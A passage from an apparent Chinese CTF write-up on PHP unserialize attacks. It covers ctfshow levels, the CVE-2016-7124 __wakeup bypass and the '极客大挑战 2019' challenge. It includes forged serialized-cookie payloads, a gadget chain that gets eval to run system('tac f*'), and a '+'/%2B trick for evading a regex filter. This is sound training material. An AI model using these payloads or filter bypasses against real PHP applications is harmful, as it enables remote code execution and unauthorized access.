class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = unserialize(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;checkVip())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;vipOneKeyGetFlag();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload：</p><blockquote><p>GET:username=xxxxxx&amp;password=xxxxxx Cookie:user=O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;username!==<span class="hljs-keyword">$this</span>-&gt;password)&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>              &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = unserialize(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;checkVip())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;vipOneKeyGetFlag();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>GET 传入的<code>username和password</code>进入<code>login</code>，判断反序列化对象<code>user</code>后传入的<code>username和password</code>是否等于<code>login</code>传入的(即 GET 传入的）两个值，而<code>vipOneKeyGetFlag</code>要求两个值不相等</p><p>payload：</p><blockquote><p>GET:username=a&amp;password=b Cookie:O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%22a%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%22b%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class=<span class="hljs-keyword">new</span> info();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class-&gt;getInfo();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">info</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;user;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = unserialize(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>    <span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>定位到 eval，显然需要 cat 查看 flag</p><blockquote><p>$code=”system(‘tac f*‘)”</p></blockquote><p>那么就要使用<code>getInfo</code>方法，从而需要实例化类<code>backDoor</code>而不是类<code>Info</code>，构造如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class=<span class="hljs-keyword">new</span> backDoor();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&quot;system(&#x27;tac f*&#x27;);&quot;</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> ctfShowUser();<br><span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-comment">//序列化$a：O:11:&quot;ctfShowUser&quot;:1:&#123;s:5:&quot;class&quot;;O:8:&quot;backDoor&quot;:1:&#123;s:14:&quot;backDoorcode&quot;;s:17:&quot;system(&#x27;tac f*&#x27;);&quot;;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>这里会提出一个问题，在上面的 PHP 序列化的格式中提到：<strong>public/protected/private 在序列化时</strong>，序列化不会保存方法，那上面的这行代码起什么作用</p><blockquote><p>$this-&gt;class=new backDoor();</p></blockquote><p>其实这里会把实例化的<code>backDoor</code>对象信息放到<code>ctfShowUser</code>类里再实例化为<code>ctfShowUser</code>的对象<code>a</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class=<span class="hljs-keyword">new</span> info();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class-&gt;getInfo();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">info</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;user;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$user</span> = unserialize(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>    &#125;<br>    <span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>对比上题增加了正则匹配，<code>/[oc]:\d+:/i</code>匹配在引号前的字母<code>o</code>或<code>c</code>，还有引号后的数字，再一个引号</p><p>即匹配格式<code>x : num :</code></p><p>反序列化后首字母肯定是<code>o</code>，那么就在数字前加一个<code>+</code></p><p>值得注意的是，空格在 php 的 urlencode 会编码为<code>+</code>，如果此时在数字前再加入<code>+</code>，则会把 payload 中的<code>+</code>编码为<code>%2B</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211009121949046.png"></p><p>建议做法是，先通过 php 的 urlencode，然后手动插入<code>%2B</code></p><p>当然也可以不加 urlencode，然后添加<code>+</code>，然后整体编码，但是含有 private 时复制不了不可见的字符，故此做法只适合不存在 private 属性</p><h3 id="SoFun"><a href="#SoFun" class="headerlink" title="SoFun"></a>SoFun</h3><h3 id="CVE-2016-7124-wakeup-的绕过）"><a href="#CVE-2016-7124-wakeup-的绕过）" class="headerlink" title="CVE-2016-7124(__wakeup 的绕过）"></a>CVE-2016-7124(__wakeup 的绕过）</h3><p><strong>当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup()的执行。</strong></p><p>PHP5 &lt; 5.6.25</p><p>PHP7 &lt; 7.0.10</p><p>利用如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   error_reporting(<span class="hljs-number">0</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span> = <span class="hljs-string">&#x27;flag&#x27;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;key))&#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;key == <span class="hljs-string">&#x27;flag&#x27;</span>)<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;success&#x27;</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;key = <span class="hljs-string">&#x27;you failed 23333&#x27;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;key;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;answer&#x27;</span>]))&#123;<br>        show_source(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$answer</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;answer&#x27;</span>];<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$answer</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> unserialize(<span class="hljs-variable">$answer</span>);<span class="hljs-comment">//</span><br>    &#125;<br><br><span class="hljs-comment">//__destruct已经赋值$key=flag 而__wakeup又把变量给覆盖</span><br><span class="hljs-comment">//O:4:&quot;Test&quot;:1:&#123;s:3:&quot;key&quot;;s:4:&quot;flag&quot;;&#125;</span><br><span class="hljs-comment">//O:4:&quot;Test&quot;:2:&#123;s:3:&quot;key&quot;;s:4:&quot;flag&quot;;&#125; 绕过__wakeup</span><br></code></pre></td></tr></table></figure><h4 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="极客大挑战 2019 PHP"></a>极客大挑战 2019 PHP</h4><p><a href="http://www.zip/">www.zip</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//class.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;100&#x27;</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Name();<br><span class="hljs-variable">$a</span> = serialize(<span class="hljs-variable">$a</span>);<br>var_dump(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-comment">//手动修改特殊字符以及绕过__Wakeup()</span><br><span class="hljs-comment">//O:4:&quot;Name&quot;:2:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</span><br><br><br><span class="hljs-comment">//有时是url的get传参 那么就可以使用url编码 省去修改特殊字符的操作</span><br><span class="hljs-comment">//$a = str_replace(2,3,$a);</span><br><span class="hljs-comment">//var_dump(urlencode($a));</span><br></code></pre></td></tr></table></figure><h4 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h4><p>查看图片元素得到<code>showimg.php?img=c2hpZWxkLmpwZw==</code></p><p>img 后面的猜是 base64 解码后是 shield.jpg</p><p>不断改变 base64 的值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//showimg.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$f</span>)) &#123;<br><span class="hljs-variable">$f</span> = base64_decode(<span class="hljs-variable">$f</span>);<br><span class="hljs-keyword">if</span> (stripos(<span class="hljs-variable">$f</span>,<span 